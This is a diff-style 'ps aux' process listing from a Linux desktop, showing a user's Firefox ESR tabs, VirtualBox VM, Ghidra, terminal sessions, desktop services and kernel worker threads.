+derek       3572  0.0  0.1 445256 48684 tty1     Sl   Sep26   1:25 /usr/bin/python3 /usr/bin/blueman-tray
+derek       3578  0.0  0.0 310672  8080 ?        Ssl  Sep26   0:00 /usr/libexec/gvfs-gphoto2-volume-monitor
+derek       3588  0.0  0.0 309252  7248 ?        Ssl  Sep26   0:00 /usr/libexec/gvfs-goa-volume-monitor
+derek       3593  0.0  0.0 391448  9528 ?        Ssl  Sep26   0:05 /usr/libexec/gvfs-afc-volume-monitor
+derek       3631  0.0  0.0 535820  9816 ?        Sl   Sep26   0:00 /usr/libexec/gvfsd-trash --spawner :1.22 /org/gtk/gvfs/exec_spaw/0
+derek       4951  0.0  0.0 484156 20184 ?        Ssl  Sep26   0:00 /usr/libexec/xdg-desktop-portal
+derek       4968  0.0  0.0 309008  7088 ?        Ssl  Sep26   0:00 /usr/libexec/xdg-permission-store
+derek       4973  0.0  0.0 540092  7620 ?        Ssl  Sep26   0:00 /usr/libexec/xdg-document-portal
+root        4979  0.0  0.0   2596  1980 ?        Ss   Sep26   0:00 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
+derek       4982  0.0  0.0 484332 21164 ?        Ssl  Sep26   0:01 /usr/libexec/xdg-desktop-portal-gtk
+derek       4998  0.0  0.0 314452  9072 ?        Ssl  Sep26   0:00 /usr/bin/gnome-keyring-daemon --start --foreground --components=secrets
+derek       5008  0.0  0.0 183648 10356 ?        Ssl  Sep26   0:00 /usr/bin/gnome-keyring-daemon --foreground --components=pkcs11,secrets --control-directory=/run/user/1000/keyring
+derek       6994  2.1  4.3 13659828 1426528 tty1 Sl   Sep26 107:53 /usr/lib/firefox-esr/firefox-esr
+derek       6999  0.0  0.0  21260  3156 ?        Sl   Sep26   0:00 /usr/lib/firefox-esr/crashhelper 6994 9 /tmp/ 11
+derek       7099  0.0  0.1 241492 48296 tty1     Sl   Sep26   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20260609153453 -prefsHandle 0:35309 -prefMapHandle 1:273500 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {b385ab72-d7e9-42d2-87b3-f9eaea86dc3c} -parentPid 6994 -crashReporter 5 -crashHelper 6 -appDir /usr/lib/firefox-esr/browser 1 socket
+derek       7128  0.0  0.9 2875996 299608 tty1   Sl   Sep26   0:58 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:35385 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {ce581da2-d4ea-47e3-bbc0-ba1143fb89f9} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 2 tab
+derek       7133  0.0  0.7 706068 247020 tty1    Sl   Sep26   4:44 /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20260609153453 -prefsHandle 0:35385 -prefMapHandle 1:273500 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {4e55c10d-e578-4ddf-8a2f-e5285ef57fba} -parentPid 6994 -crashReporter 5 -crashHelper 6 -appDir /usr/lib/firefox-esr/browser 3 rdd
+pcscd       7164  0.0  0.0 257552  7624 ?        Ssl  Sep26   0:00 /usr/sbin/pcscd --foreground --auto-exit
+derek       7382  0.0  0.3 2485768 114540 tty1   Sl   Sep26   0:02 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:43850 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {156bbb5a-8671-46fd-970a-801ea3799e49} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 4 tab
+derek       7436  0.0  0.1 362224 61352 tty1     Sl   Sep26   1:33 /usr/lib/firefox-esr/firefox-esr -contentproc -parentBuildID 20260609153453 -sandboxingKind 0 -prefsHandle 0:44046 -prefMapHandle 1:273500 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {6700bec4-a768-4eb2-a609-87308e9ee33c} -parentPid 6994 -crashReporter 5 -crashHelper 6 -appDir /usr/lib/firefox-esr/browser 5 utility
+derek       7458  1.2  1.5 7602084 514448 tty1   Sl   Sep26  62:45 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:40978 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {1ba2afab-0ebe-4524-b950-e92a5f0a1497} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 7 tab
+derek       7624  0.0  0.2 815440 73572 tty1     Sl   Sep26   0:02 /usr/bin/qterminal
+derek       7631  0.0  0.0  14256  7816 pts/0    Ss   Sep26   0:00 /usr/bin/zsh
+derek       7811  0.1  0.5 2088776 187984 pts/0  Sl+  Sep26   8:06 /usr/lib/virtualbox/VirtualBox
+derek       7827  0.4  0.1 1600388 63020 ?       Sl   Sep26  20:54 /usr/lib/virtualbox/VBoxSVC --auto-shutdown --inherit-startup-pipe 20
+derek       8068  0.0  0.0 192040 21256 ?        Sl   Sep26   0:47 /usr/lib/virtualbox/VBoxNetDHCP --comment HostInterfaceNetworking-vboxnet0 --config /home/derek/.config/VirtualBox/HostInterfaceNetworking-vboxnet0-Dhcpd.config --log /home/derek/.config/VirtualBox/HostInterfaceNetworking-vboxnet0-Dhcpd.log
+root        8090  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-dio/nvme0n1p2]
+derek       8304  7.9 13.9 7467840 4576844 ?     Sl   Sep26 394:15 /usr/lib/virtualbox/VirtualBoxVM --comment F --startvm a0abb0bc-c7b7-48b4-a102-a03c3db1aa07 --no-startvm-errormsgbox
+root     1990299  0.0  0.2  73492 73468 ?        S<Ls 00:00   0:17 /usr/bin/atop -w /var/log/atop/atop_20260929 600
+derek    2391398  1.7  0.8 3061028 288540 tty1   Sl   12:03  11:10 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41274 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {3a45b133-68c9-4201-81fe-8c357b58acbd} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 25 tab
+derek    2467082  0.0  0.0 462508  9892 ?        Sl   14:13   0:00 /usr/libexec/gvfsd-network --spawner :1.22 /org/gtk/gvfs/exec_spaw/1
+derek    2467089  0.0  0.0 388632  9180 ?        Sl   14:13   0:00 /usr/libexec/gvfsd-dnssd --spawner :1.22 /org/gtk/gvfs/exec_spaw/2
+derek    2470202  0.0  0.2 1985372 81756 tty1    Sl   14:17   0:23 mousepad
+derek    2472006  0.0  0.2 815232 73700 tty1     Sl   14:19   0:01 /usr/bin/qterminal
+derek    2472014  0.0  0.0  10792  7004 pts/1    Ss+  14:19   0:00 /usr/bin/zsh
+derek    2474611  1.5  1.3 7385704 449260 tty1   Sl   14:23   7:38 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {300bee5a-36ce-4ca8-b3dc-afd4e6f930b3} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 31 tab
+derek    2497431  3.5  1.7 7626752 568212 tty1   Sl   14:58  16:28 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {d908f86b-765c-478f-bad6-87cd42d4d860} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 48 tab
+derek    2499122  1.8  0.9 2915556 296064 tty1   Sl   15:00   8:36 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {6da640a3-4f9b-4b2d-8ae6-42cb8ac93e40} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 52 tab
+derek    2499336  1.8  0.8 2856096 277540 tty1   Sl   15:00   8:44 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {e8f73a5b-6b82-4915-ac91-49c9e566f638} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 53 tab
+derek    2499387  1.8  1.0 2936216 331484 tty1   Sl   15:00   8:45 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {97dd42d7-2dd2-4d03-a790-cb463b287e6e} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 54 tab
+derek    2505074  0.1  0.7 2809376 249648 tty1   Sl   15:10   0:37 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {de5c00c7-038e-4de0-899e-cd78d54cf50e} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 57 tab
+derek    2506771  0.0  0.5 2617776 177988 tty1   Sl   15:12   0:11 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:44344 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {3011f319-4afb-4625-8ef6-6387ad12b668} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 58 tab
+derek    2507856  0.0  0.3 2461860 106732 tty1   Sl   15:14   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {4e705da1-a33f-4074-b5d5-ffcfcf4bdd79} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 59 tab
+derek    2508091  0.0  0.3 2463632 110488 tty1   Sl   15:14   0:02 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {0a74e13a-dc0d-4904-bbe3-d11504e888cb} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 61 tab
+derek    2508123  0.0  0.9 2793856 298272 tty1   Sl   15:14   0:22 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {f9bb8f82-04a9-44ae-965e-75932674990f} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 62 tab
+derek    2516261  0.2  1.7 3524052 560956 tty1   Sl   15:23   1:09 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41276 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {c148f4be-ebec-428f-ac84-4042d45851df} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 63 tab
+derek    2622421  0.0  0.2 807168 67076 tty1     Sl   18:29   0:00 /usr/bin/qterminal
+derek    2622430  0.0  0.0  10644  6720 pts/2    Ss+  18:29   0:00 /usr/bin/zsh
+derek    2623136  0.0  0.2 889932 75256 tty1     Sl   18:30   0:02 /usr/bin/qterminal
+derek    2623144  0.0  0.0  10928  7416 pts/3    Ss+  18:30   0:01 /usr/bin/zsh
+derek    2629056  0.0  0.3 918012 100680 tty1    Sl   18:32   0:02 /usr/bin/qterminal
+derek    2629064  0.0  0.0  14236  8044 pts/4    Ss+  18:32   0:00 /usr/bin/zsh
+derek    2636139  0.3  1.0 3113020 358736 tty1   Sl   18:37   0:45 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {575cc665-5eea-4910-9b3f-5ab44453a755} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 73 tab
+derek    2637555  0.0  0.2 893652 74972 tty1     Sl   18:39   0:02 /usr/bin/qterminal
+derek    2637563  0.0  0.0  14256  8296 pts/5    Ss+  18:39   0:00 /usr/bin/zsh
+derek    2638307  0.0  1.0 2795320 350252 tty1   Sl   18:40   0:13 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {7fad8d06-6636-4af5-b205-26fdfe4576e6} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 78 tab
+root     2641717  0.0  0.0      0     0 ?        I<   18:45   0:00 [kworker/u69:2-rb_allocator]
+derek    2642594  0.1  1.0 2948800 340100 tty1   Sl   18:46   0:20 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41274 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {fb57e8ea-f77e-49cb-a6b4-d8ca3a872565} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 85 tab
+derek    2648227  0.0  0.2 961820 73276 tty1     Sl   18:54   0:00 /proc/7624/exe
+derek    2648235  0.0  0.0  14080  8036 pts/6    Ss+  18:54   0:00 /usr/bin/zsh
+derek    2652209  0.0  0.2 963728 74668 tty1     Sl   18:58   0:01 /usr/bin/qterminal
+derek    2652225  0.0  0.0  14044  7844 pts/7    Ss+  18:58   0:00 /usr/bin/zsh
+derek    2662339  0.5  1.3 3152096 435024 tty1   Sl   19:10   1:07 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {573a4377-ea4e-4cef-a2e0-da4308dc983f} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 110 tab
+derek    2662767  0.0  0.2 1044104 82952 tty1    Sl   19:10   0:01 /usr/bin/qterminal
+derek    2662775  0.0  0.0  14404  8600 pts/8    Ss   19:10   0:03 /usr/bin/zsh
+derek    2662971  0.2  1.7 15890424 578752 pts/8 Sl   19:11   0:36 /usr/lib/jvm/java-21-openjdk-amd64/bin/java -Djava.system.class.loader=ghidra.GhidraClassLoader -Dfile.encoding=UTF8 -Duser.country=US -Duser.language=en -Duser.variant= -Dsun.java2d.opengl=false -Djdk.tls.client.protocols=TLSv1.2,TLSv1.3 -Dcpu.core.limit= -Dcpu.core.override= -Dfont.size.override= -Dpython.console.encoding=UTF-8 -Xshare:off -Djavax.xml.accessExternalDTD= -Djavax.xml.accessExternalSchema= -Djavax.xml.accessExternalStylesheet= --enable-native-access=ALL-UNNAMED -Dsun.java2d.pmoffscreen=false -Dsun.java2d.xrender=true -Dsun.java2d.uiScale=1 -Dawt.useSystemAAFontSettings=on -showversion -cp /opt/ghidra/ghidra_12.1.2_PUBLIC/support/../Ghidra/Framework/Utility/lib/Utility.jar ghidra.Ghidra ghidra.GhidraRun
+derek    2669709  2.6  2.3 3321328 767104 tty1   Sl   19:18   5:34 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {bf88d51f-81e8-4774-8691-4ea10f763b4f} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 114 tab
+derek    2670779  0.0  0.4 2500796 138676 tty1   Sl   19:20   0:01 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {4ba3755a-4daf-4faf-a6cf-d2cd379fbdd7} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 115 tab
+derek    2678044  0.0  0.1 1964412 41452 tty1    Sl   19:28   0:00 xfce4-display-settings -m
+derek    2706671  0.0  0.0  10644  6836 pts/9    Ss+  19:49   0:00 /usr/bin/zsh
+root     2716528  0.0  0.0      0     0 ?        I<   19:56   0:00 [kworker/u69:0-rb_allocator]
+root     2868585  0.0  0.0      0     0 ?        I    21:57   0:00 [kworker/u65:1-flush-259:0]
+root     2886461  0.0  0.0      0     0 ?        I    22:11   0:00 [kworker/10:3-cgroup_free]
+derek    2895511  0.0  0.3 2461860 103880 tty1   Sl   22:18   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {f07f52b8-19e9-44b2-86b1-80c5d841c9ae} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 288 tab
+root     2900755  0.0  0.0      0     0 ?        I    22:22   0:00 [kworker/12:1-events]
+root     2901199  0.0  0.0      0     0 ?        I    22:23   0:00 [kworker/3:1-cgroup_free]
+root     2901206  0.0  0.0      0     0 ?        I    22:23   0:00 [kworker/u65:3-flush-259:0]
+root     2901208  0.0  0.0      0     0 ?        I    22:23   0:00 [kworker/8:3-cgroup_release]
+root     2901428  0.0  0.0      0     0 ?        I    22:23   0:00 [kworker/u66:2-flush-259:0]
+root     2901656  0.0  0.0      0     0 ?        I    22:23   0:00 [kworker/9:1-mm_percpu_wq]
+root     2905186  0.0  0.0      0     0 ?        I    22:26   0:00 [kworker/5:2-mm_percpu_wq]
+root     2906098  0.0  0.0      0     0 ?        I    22:27   0:00 [kworker/15:0-events]
+root     2906736  0.0  0.0      0     0 ?        I    22:27   0:00 [kworker/7:3-cgroup_release]
+root     2907214  0.0  0.0      0     0 ?        I    22:28   0:00 [kworker/13:3-mm_percpu_wq]
+root     2908132  0.0  0.0      0     0 ?        I    22:28   0:00 [kworker/1:3-dio/nvme0n1p2]
+root     2908873  0.0  0.0      0     0 ?        I    22:29   0:00 [kworker/u66:3-events_unbound]
+root     2913019  0.0  0.0      0     0 ?        I    22:32   0:00 [kworker/15:3-cgroup_release]
+root     2913240  0.0  0.0      0     0 ?        I    22:32   0:00 [kworker/11:2-cgroup_free]
+root     2914729  0.0  0.0      0     0 ?        I    22:33   0:00 [kworker/4:0-events]
+root     2914876  0.0  0.0      0     0 ?        I    22:34   0:00 [kworker/0:1-cgroup_release]
+root     2916330  0.0  0.0      0     0 ?        I    22:35   0:00 [kworker/2:2-cgroup_release]
+root     2917471  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/6:0-cgroup_release]
+root     2917588  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/7:0-cgroup_release]
+root     2917693  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/u65:2-events_unbound]
+root     2918131  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/8:2-cgroup_release]
+root     2918571  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/14:0-events]
+root     2918572  0.0  0.0      0     0 ?        I    22:36   0:00 [kworker/14:2-cgroup_release]
+root     2919713  0.0  0.0      0     0 ?        I    22:37   0:00 [kworker/2:3-events]
+root     2919946  0.0  0.0      0     0 ?        I    22:38   0:00 [kworker/6:1-cgroup_free]
+root     2920924  0.0  0.0      0     0 ?        I    22:38   0:00 [kworker/10:0-cgroup_release]
+root     2921187  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/11:1-mm_percpu_wq]
+root     2921528  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/12:0-cgroup_release]
+root     2921754  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/0:0-dio/nvme0n1p2]
+root     2922113  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/4:3-events]
+root     2922333  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/3:3-cgroup_offline]
+root     2923954  0.0  0.0      0     0 ?        I    22:41   0:00 [kworker/u66:1-events_unbound]
+root     2924024  0.0  0.0      0     0 ?        I    22:41   0:00 [kworker/1:0-mm_percpu_wq]
+root     2924671  0.0  0.0      0     0 ?        I    22:41   0:00 [kworker/9:2-events]
+root     2925116  0.0  0.0      0     0 ?        I    22:42   0:00 [kworker/8:0-cgroup_free]
+root     2925560  0.0  0.0      0     0 ?        I    22:42   0:00 [kworker/13:2-cgroup_free]
+root     2925684  0.0  0.0      0     0 ?        I    22:42   0:00 [kworker/15:1-cgroup_release]
+root     2925778  0.0  0.0      0     0 ?        I    22:42   0:00 [kworker/1:2-dio/nvme0n1p2]
+root     2926480  0.0  0.0      0     0 ?        I    22:43   0:00 [kworker/5:1-events]
+root     2927160  0.0  0.0      0     0 ?        I    22:43   0:00 [kworker/6:2-mm_percpu_wq]
+root     2927842  0.0  0.0  10000  5704 ?        S    22:44   0:00 systemd-userwork: waiting...
+root     2928039  0.0  0.0      0     0 ?        I    22:44   0:00 [kworker/12:2-cgroup_release]
+root     2928067  0.0  0.0      0     0 ?        I    22:44   0:00 [kworker/14:1-cgroup_free]
+root     2928424  0.0  0.0      0     0 ?        I    22:44   0:00 [kworker/0:2-mm_percpu_wq]
+derek    2929016  0.0  0.3 2472312 100880 tty1   Sl   22:45   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {bf1ab04b-af73-4abb-a88f-d24dd165e468} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 316 tab
+root     2929252  0.0  0.0      0     0 ?        I    22:45   0:00 [kworker/8:1-events]
+derek    2929363  0.0  0.2 2441660 82332 tty1    Sl   22:45   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {a961d7ce-b5f8-4719-affa-1f16e7e39326} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 317 tab
+root     2929727  0.0  0.0      0     0 ?        I    22:45   0:00 [kworker/6:3-dio/nvme0n1p2]
+root     2929946  0.0  0.0      0     0 ?        I    22:45   0:00 [kworker/3:0-events]
+root     2930019  0.0  0.0      0     0 ?        I    22:46   0:00 [kworker/7:1-events]
+root     2930595  0.0  0.0  10000  5648 ?        S    22:46   0:00 systemd-userwork: waiting...
+root     2930610  0.0  0.0      0     0 ?        I    22:46   0:00 [kworker/u66:0]
+root     2930828  0.0  0.0      0     0 ?        I    22:46   0:00 [kworker/2:0-cgroup_release]
+root     2931282  0.0  0.0      0     0 ?        I    22:47   0:00 [kworker/15:2-events]
+root     2931501  0.0  0.0      0     0 ?        I    22:47   0:00 [kworker/12:3-dio/nvme0n1p2]
+root     2931750  0.0  0.0      0     0 ?        I    22:47   0:00 [kworker/7:2-cgroup_free]
+root     2932175  0.0  0.0  10000  5784 ?        S    22:47   0:00 systemd-userwork: waiting...
+root     2932207  0.0  0.0      0     0 ?        I    22:47   0:00 [kworker/0:3-events]
+derek    2932249  0.1  0.2 2441660 81120 tty1    Sl   22:47   0:00 /usr/lib/firefox-esr/firefox-esr -contentproc -isForBrowser -prefsHandle 0:41275 -prefMapHandle 1:273500 -jsInitHandle 2:242716 -parentBuildID 20260609153453 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {4e417e22-0af3-4cca-a02e-1bcf39713309} -parentPid 6994 -crashReporter 6 -crashHelper 7 -greomni /usr/lib/firefox-esr/omni.ja -appomni /usr/lib/firefox-esr/browser/omni.ja -appDir /usr/lib/firefox-esr/browser 318 tab
+root     2932464  0.0  0.0      0     0 ?        I    22:47   0:00 [kworker/10:1-events]
+root     2932690  0.0  0.0      0     0 ?        I    22:48   0:00 [kworker/2:1-events]
+derek    2932957  0.8  0.2 815376 74400 tty1     Sl   22:48   0:00 /usr/bin/qterminal
+derek    2932965  0.7  0.0  10800  6960 pts/10   Ss   22:48   0:00 /usr/bin/zsh
+derek    2932976  0.0  0.0   3580  2288 tty1     S    22:48   0:00 bwrap --unshare-all --die-with-parent --chdir / --ro-bind /usr /usr --dev /dev --ro-bind-try /etc/ld.so.cache /etc/ld.so.cache --ro-bind-try /nix/store /nix/store --tmpfs /tmp-home --tmpfs /tmp-run --clearenv --setenv HOME /tmp-home --setenv XDG_RUNTIME_DIR /tmp-run --setenv XDG_RUNTIME_DIR /run/user/1000 --symlink /usr/lib32 /lib32 --symlink /usr/libx32 /libx32 --symlink /usr/lib64 /lib64 --symlink /usr/lib /lib --seccomp 30 /usr/libexec/glycin-loaders/2+/glycin-image-rs --dbus-fd 29
